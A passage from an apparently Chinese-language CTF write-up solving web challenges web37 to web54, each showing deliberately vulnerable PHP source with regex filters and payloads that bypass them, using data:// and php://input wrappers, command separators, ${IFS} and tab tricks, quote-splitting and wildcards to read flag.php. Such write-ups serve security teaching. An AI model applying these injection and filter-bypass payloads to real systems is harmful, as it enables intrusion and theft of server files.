这边使用的函数与上一部分略有区别，修改了部分，使用的是include函数的利用方法

仅过滤了flag字样，还是简单的

#### 方法一

使用了伪协议+base编码绕过读取

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=</span><br></pre></td></tr></table></figure>

#### 方法二

重点还是对伪协议的利用，*的绕过方法参考上面，当然，也可以使用?绕过

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?php system(&quot;tac fla*.php&quot;)?&gt;</span><br></pre></td></tr></table></figure>

#### 方法三

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=php://input</span><br></pre></td></tr></table></figure>

Post

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&quot;tac flag.php&quot;)?&gt;</span><br></pre></td></tr></table></figure>

## web38

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

增加了php和file两个协议的过滤

#### 方法一

使用了伪协议+base编码绕过读取

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=</span><br></pre></td></tr></table></figure>

#### 方法二

重点还是对伪协议的利用，*的绕过方法参考上面，当然，也可以使用?绕过

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?php system(&quot;tac fla*.php&quot;)?&gt;</span><br></pre></td></tr></table></figure>

## web39

### 源码

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag in flag.php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;</span><br><span class="line">        include($c.&quot;.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

自动拼接.php

#### 方法一

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?php system(&quot;tac%20fla*.php&quot;);?&gt;</span><br></pre></td></tr></table></figure>

## web40

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

#### 方法一

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>

参考web31方法三

#### 方法二

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=eval(next(reset(get_defined_vars())));&amp;1=;system(&quot;tac%20flag.php&quot;); </span><br></pre></td></tr></table></figure>

1. `?c=eval(next(reset(get_defined_vars())));`: 这部分是通过URL参数传递的命令。解析过程如下：

   - `get_defined_vars()`: 获取当前作用域中所有已定义的变量的列表。
   - `reset()`: 将数组内部的指针指向第一个元素，并返回该元素的值。
   - `next()`: 将数组内部的指针移动到下一个元素，并返回该元素的值。
   - `eval()`: 执行传入的字符串作为PHP代码。

   综合起来，这一部分的目的是获取当前作用域中的一个已定义变量，并将其值作为字符串传递给 `eval()` 函数，实际上是执行这个字符串作为PHP代码。

2. `&1=;system("tac%20flag.php");`: 这是第二个URL参数，其中 `1` 是参数名，而 `;` 表示将其值设为空。接着是一个 `system()` 函数调用，尝试执行系统命令。

   - `system("tac%20flag.php");`: 这部分试图执行 `tac` 命令，`tac` 是Linux系统中的一个命令，用于反向读取文件内容。`%20` 是URL编码中的空格。

## web41

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

### payload

本题过滤了字母和数字，那很明显就是考察的无字母数字rce了

详细的需要单独开一篇去说明相关原理和衍生方法

## web42

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

本题的关键在于使用了一个重定向，导致了无回显

使用分隔来进行绕过

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;     分号</span><br><span class="line">|     只执行后面那条命令</span><br><span class="line">||    只执行前面那条命令</span><br><span class="line">&amp;     两条命令都会执行</span><br><span class="line">&amp;&amp;    两条命令都会执行</span><br><span class="line">%0a   换行符的url 编码</span><br></pre></td></tr></table></figure>

#### 方法一

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac flag.php;ls</span><br></pre></td></tr></table></figure>

#### 方法二

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac flag.php||ls</span><br></pre></td></tr></table></figure>

#### 方法三

使用&和&&需要对其进行url编码

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac flag.php%26ls</span><br></pre></td></tr></table></figure>

#### 方法四

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac flag.php%0a</span><br></pre></td></tr></table></figure>

## web43

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

这里添加对cat命令和;的过滤，参考前部分的bypass手段即可，因此这边只给出一种参考payload

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac flag.php%0a</span><br></pre></td></tr></table></figure>

## web44

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/;|cat|flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

增加了对flag的过滤，直接参考上面

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac fla*.php%0a</span><br></pre></td></tr></table></figure>

## web45

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| /i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

过滤了空格

#### 方法一

%09绕过

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac%09fla*.php%0a</span><br></pre></td></tr></table></figure>

#### 方法二

\${IFS}和\${IFS}$+数字绕过

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac$&#123;IFS&#125;fla*.php%0a</span><br><span class="line">?c=tac$&#123;IFS&#125;$9fla*.php%0a</span><br></pre></td></tr></table></figure>

## web46

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

过滤了数字，$，*

那么就需要做相应修改

空格使用%09，url解析为Tab，%0a，url解析为回车，*被禁用，改成?就好了

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac%09fla?.php%0a</span><br></pre></td></tr></table></figure>

## web47

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

1. **`more`：**
   - `more` 命令用于逐页显示文本文件的内容。当文本文件内容超过一个屏幕时，`more` 会逐页显示，并且等待用户按键（通常是空格键）以继续显示下一页。
2. **`less`：**
   - `less` 也是用于逐页显示文本文件的内容，但相较于 `more` 具有更多功能和交互性。用户可以通过键盘进行向前翻页、向后翻页、搜索等操作。
3. **`head`：**
   - `head` 命令用于显示文件的开头部分，默认显示文件的前 10 行。可以使用参数指定显示的行数。
4. **`sort`：**
   - `sort` 命令用于对文本文件进行排序，默认以字母顺序排序。可以通过不同的选项来实现不同的排序方式，如数字排序等。
5. **`tail`：**
   - `tail` 命令用于显示文件的结尾部分，默认显示文件的最后 10 行。可以使用参数指定显示的行数。它通常用于监视正在进行的日志文件。

增添了部分命令的过滤，如上

Payload直接沿用上一个

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac%09fla?.php%0a</span><br></pre></td></tr></table></figure>

## web48

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

1. **`sed`：**
   - `sed`（Stream Editor）是一个流编辑器，用于对文本进行流式处理。它可以进行文本替换、删除、插入等操作，通常与正则表达式一起使用。
2. **`cut`：**
   - `cut` 命令用于从文本行或字段中剪切出指定的部分。它通常用于处理以特定分隔符分割的文本文件，如CSV文件。
3. **`awk`：**
   - `awk` 是一种强大的文本处理工具，用于在文本文件中逐行进行处理。它支持自定义的文本处理脚本，可以执行复杂的文本分析和转换操作。
4. **`strings`：**
   - `strings` 命令用于从二进制文件中提取可打印的字符串。它通常用于查找二进制文件中的文本信息，如可执行文件或库文件。
5. **`od`：**
   - `od`（octal dump）命令以八进制、十六进制或其他格式显示文件的内容。它通常用于查看二进制文件的内容。
6. **`curl`：**
   - `curl` 是一个命令行工具，用于通过 URL 进行数据传输。它支持多种协议，包括 HTTP、HTTPS、FTP 等，可以用于下载文件、发送请求等网络操作。

过滤以上

不妨碍上一个payload，但是我们也可以去相应探究所禁止的这些命令的利用方法

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac%09fla?.php%0a</span><br></pre></td></tr></table></figure>

## web49

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

新增过滤了`，%

注意在输入%09和%0a的时候，实际解析为下文，自行查找

[HTML URL 编码参考手册 (w3school.com.cn)](https://www.w3school.com.cn/tags/html_ref_urlencode.asp)

因此该payload依旧能打通

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac%09fla?.php%0a</span><br></pre></td></tr></table></figure>

## web50

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

新增过滤\x09|\x26

这边使用nl命令

`nl` 是一个用于在文本文件中显示行号的命令。该命令通常在命令行终端中使用，用于对文本文件进行行号标记，方便用户查看和定位特定行。

以下是 `nl` 命令的基本用法：

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">nl</span> [选项] 文件名</span><br></pre></td></tr></table></figure>

主要选项包括：

- `-b`：指定行号的计数方式，可以是 `t`（表示非空行）、`a`（表示所有行）、`n`（表示不标行号）。
- `-i`：设置行号的递增间隔。
- `-v`：指定行号的起始值。

例如，要对文件 `example.txt` 进行行号标记，可以使用以下命令：

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">nl</span> example.txt</span><br></pre></td></tr></table></figure>

这将输出带有行号的文件内容。`nl` 命令对于查看大型文本文件或在脚本中进行文本处理时很有用。

给出payload

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=nl&lt;fla&#x27;&#x27;g.php%0a</span><br></pre></td></tr></table></figure>

## web51

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

增加了对tac命令的过滤

可以绕过，也可以换其他命令

#### 方法一

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=t&#x27;&#x27;ac&lt;fl&#x27;&#x27;ag.php%0a</span><br></pre></td></tr></table></figure>

#### 方法二

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=nl&lt;fla&#x27;&#x27;g.php%0a</span><br></pre></td></tr></table></figure>

## web52

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

将<和>也进行了过滤，但是放开了对$的过滤

修改一个空格绕过方式就可以了

#### 方法一

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=nl$&#123;IFS&#125;/fla&#x27;&#x27;g%0a</span><br></pre></td></tr></table></figure>

#### 方法二

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=t&#x27;&#x27;ac$&#123;IFS&#125;/fl&#x27;&#x27;ag%0a</span><br></pre></td></tr></table></figure>

## web53

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$d</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

新增wegt的过滤

简单展示两种

#### 方法一

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=nl$&#123;IFS&#125;fla&#x27;&#x27;g.php%0a</span><br></pre></td></tr></table></figure>

#### 方法二

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=ca\t$&#123;IFS&#125;fla\g.php%0a</span><br></pre></td></tr></table></figure>

## web54

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

因为本题通过通配符将大部分利用命令包括其相应的绕过方式都进行了过滤

本题大致思路有两种

一种是将flag的页面复制到其他页面，再进行读取

一种是直接利用未过滤的查找命令

（多学linux

#### 方法一

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=cp$&#123;IFS&#125;???g.php$&#123;IFS&#125;t.txt</span><br></pre></td></tr></table></figure>

然后访问t.txt

#### 方法二

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=/bin/ca?$&#123;IFS&#125;????.???</span><br></pre></td></tr></table></figure>

#### 方法三

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=grep$&#123;IFS&#125;%27fla%27$&#123;IFS&#125;f???????%0a</span><br></pre></td></tr></table></figure>

#### 方法四

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c= mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;a.txt</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=uniq$&#123;IFS&#125;f???.php</span><br></pre></td></tr></table></figure>

## web55

### 源码

